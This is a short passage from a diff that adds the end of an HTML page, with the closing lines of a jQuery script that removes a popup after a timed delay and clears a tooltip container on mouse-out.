+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
